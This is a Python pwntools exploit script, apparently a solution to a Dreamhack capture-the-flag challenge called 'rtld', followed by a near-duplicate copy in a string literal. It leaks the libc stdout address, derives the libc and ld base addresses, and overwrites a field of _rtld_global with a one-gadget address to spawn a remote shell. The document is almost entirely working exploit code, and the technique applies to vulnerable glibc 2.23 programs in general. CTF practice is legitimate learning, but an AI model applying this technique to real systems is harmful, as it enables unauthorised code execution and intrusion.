
from pwn import *
#p = process('./rtld')
p = remote('host3.dreamhack.games', 9753)
e = ELF('./rtld')
libc = ELF('./libc-2.23.so')
ld = ELF('./ld-2.23.so')
p.recvuntil(b': ')
stdout = int(p.recvuntil(b'\n'), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3ca000

print('stdout..', hex(stdout))

print('libc_base..', hex(libc_base))
print('ld_base..', hex(ld_base))

rtld_global = ld_base + ld.symbols['_rtld_global']
dl_load_lock_recursive = rtld_global + 3848
print('rtld_global..', hex(rtld_global))
print('dl_load_lock_recursive ..', hex(dl_load_lock_recursive))

libc_onegadget = libc_base + 0x4527a
print('onegadget..', hex(libc_onegadget))
#get_shell = libc_base + e.symbols['get_shell']
og = libc_base + 0x4527a
p.sendlineafter(b'addr: ', str(dl_load_lock_recursive).encode())
p.sendlineafter(b'value: ', str(og).encode())
p.interactive()

#!/usr/bin/env python3
'''
from pwn import *

p = remote('host3.dreamhack.games', 9753)
elf = ELF('./rtld')
libc = ELF('./libc-2.23.so')
ld = ELF('./ld-2.23.so')
p.recvuntil(b': ')

stdout = int(p.recvuntil(b'\n'), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3ca000

print('stdout..', hex(stdout))

print('libc_base..', hex(libc_base))
print('ld_base..', hex(ld_base))

rtld_global = ld_base + ld.symbols['_rtld_global']
dl_load_lock_recursive = rtld_global + 3848

print('rtld_global..', hex(rtld_global))
print('dl_load_lock_recursive ..', hex(dl_load_lock_recursive))

libc_onegadget = libc_base + 0x4527a
print('onegadget..', hex(libc_onegadget))

p.sendlineafter(b'addr: ', str(dl_load_lock_recursive).encode())
p.sendlineafter(b'value: ', str(libc_onegadget).encode())

p.interactive()
'''